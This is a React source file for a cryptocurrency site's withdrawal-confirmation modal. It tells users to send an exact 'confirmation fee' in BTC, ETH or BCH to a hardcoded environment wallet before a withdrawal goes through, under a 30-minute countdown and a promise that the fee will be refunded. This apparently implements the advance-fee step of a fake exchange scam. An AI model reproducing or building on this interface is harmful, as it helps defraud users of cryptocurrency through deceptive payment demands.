import './styles/SignIn.css';
import './styles/Deposit.css';
import React, {useState, useContext, createContext, useMemo, useEffect, useRef} from 'react';
import Button from 'react-bootstrap/Button';
import Modal from 'react-bootstrap/Modal';
import Form from 'react-bootstrap/Form';
import depoQR from './img/depositQR.png';
import { ConfirmationContext } from './GetModal';
import env from "react-dotenv";
function GetConfirmation(props) {
  const { isConfirmed, setIsConfirmed } = useContext(ConfirmationContext);
  const [wallet, setWallet] = useState(""); // it should be passed through props depending on what coin it is
  const [count, setCount] = useState(1801);
  const [counter, setCounter] = useState("");
  const [title, setTitle] = useState("");
  const [amount, setAmount] = useState(0);

  const titleAndAmount = () => {
    const coin = props.coin;
    if (coin == "BTC") {
      setTitle("Bitcoin (BTC)");
      setAmount("0.004508 " + props.coin);
    } else if (coin == "ETH") {
      setTitle("Ethereum (ETH)")
      setAmount("0.03 " + props.coin);
    } else if (coin == "BCH") {
      setTitle("Bitcoin cash(BCH)");
      setAmount("0.5 " + props.coin);
    }
  };
  const handleClose = () => {
    setCount(1800);
    setIsConfirmed(false);
  };
  const handleSubmit = (event) => {
    event.preventDefault();
  }
  const handleWalletChange = (event) => {
    setWallet(event.target.value)
  }

  const minutes = Math.floor(count / 60);
  const seconds = count % 60;

  useEffect(() => {
    const interval = setInterval(() => {
      setCount(count - 1);
      setCounter(minutes + ':' + seconds.toString().padStart(2, '0'));
    }, 1000);

    if (count == 0) handleClose();


    return () => clearInterval(interval);

  }, [count])

  useEffect(() => {
    setWallet(props.wallet);
    titleAndAmount();
  }, [props.wallet])

  return (
    <>
      <Modal show={isConfirmed} onHide={handleClose} className="deposit get confirm">
        <Modal.Header closeButton>
          <Modal.Title>{title}</Modal.Title>
        </Modal.Header>
        <Form onSubmit={handleSubmit}>
          <Modal.Body>
            <Form.Group className="mb-3 addr">
              <div className="title">
                <Form.Label>Withdrawal confirmation</Form.Label>
              </div>
              <Form.Label className="subtitle">To confirm your wallet address and withdrawal intention by confirmation fee </Form.Label>
              <Form.Label className="subtitle">please send exactly <span style={{ fontWeight: 'bold' }}>{amount}</span> to:</Form.Label>
              <Form.Control style={{ margin: 0 }} className="text-center" disabled value={env.WALLET_WITHDRAW}/>
            </Form.Group>
          </Modal.Body>
          <Modal.Footer className="confirm-footer">
            <p>Your withdrawal will be completed after confirmation by the network. Fee amount will be fully compensated in the withdraw.</p>
            <img alt="depositQR" src={depoQR} />
            <p aria-readonly className="countdown">{counter}</p>
          </Modal.Footer>
        </Form>
      </Modal>
    </>

  )
}

export default GetConfirmation;
